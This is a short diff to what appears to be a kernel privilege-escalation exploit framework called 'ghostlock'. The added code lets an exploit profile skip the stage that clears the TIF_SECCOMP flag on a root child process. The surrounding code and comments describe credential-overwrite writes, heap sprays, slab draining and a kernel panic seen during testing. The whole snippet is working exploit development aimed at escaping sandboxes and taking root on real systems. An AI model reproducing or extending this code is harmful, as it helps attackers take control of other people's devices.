@@ -391,6 +391,18 @@ namespace ghostlock::session::backend {
                                         : child_task + ghostlock::profile::task_seccomp_off();
 
             uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
+            /* A profile may disable W3 outright (w3_attempts = 0). That is a
+             * decision, not a failure. The write primitive can only carry 0 or a
+             * valid kernel pointer, so the masked TIF_SECCOMP value never lands
+             * and the zero form clears every TIF_* flag plus the filter refcount
+             * (observed panic). Failing here instead would hand control back to
+             * the W2/W3 loop, which parks the child and redoes the whole
+             * credential write - three sprays to achieve nothing. */
+            if (w3_attempts == 0) {
+                pr_warning("W3 disabled by profile; the root child keeps its app seccomp filter\n");
+                seccomp_ok = 0;
+                return true;
+            }
             for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
                 pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
                 if (attempt == 1) attack::slab_drain();
